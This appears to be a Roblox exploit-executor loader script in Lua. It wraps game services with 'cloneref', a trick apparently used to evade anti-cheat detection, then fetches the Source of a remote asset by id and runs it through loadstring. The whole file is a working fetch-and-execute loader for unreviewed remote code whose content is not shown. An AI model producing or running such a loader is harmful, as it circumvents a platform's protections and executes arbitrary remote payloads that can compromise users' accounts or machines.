Services = setmetatable({},{__index=function(s,r) return game:service(r) end})

local cloneref = cloneref or function(ref)
    return ref
end

local ScriptContext = cloneref(Services.ScriptContext)
local InsertService = cloneref(Services.InsertService)
local CoreGui = cloneref(Services.CoreGui)
local ContentProvider = cloneref(Services.ContentProvider)

local table_insert = table.insert
local table_foreach = table.foreach
local string_char = string.char
local getobjects = function(a)
    local Objects = {}
    if a then
        local b = InsertService:LoadLocalAsset(a)
        if b then 
            table_insert(Objects, b) 
        end
    end
    return Objects
end

task.spawn(function()
loadstring(getobjects('rbxassetid://6996343412')[1].Source)()
end)
